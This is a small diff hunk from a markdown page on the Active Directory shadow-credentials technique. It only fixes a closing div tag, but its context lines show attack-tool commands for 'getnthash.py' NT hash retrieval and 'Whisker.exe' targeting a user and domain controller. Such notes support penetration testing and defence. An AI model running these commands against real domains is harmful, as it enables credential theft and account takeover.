@@ -87,7 +87,7 @@ python3 getnthash.py <DOMAIN>/<USERNAME> -key <AS-REP_encryption_key>
 .\Whisker.exe list /domain:<DOMAIN> /target:<TARGET_USER> /dc:<DC>
 ```
 
-<div>
+</div>
 
 #### 1. Add shadow credentials
 
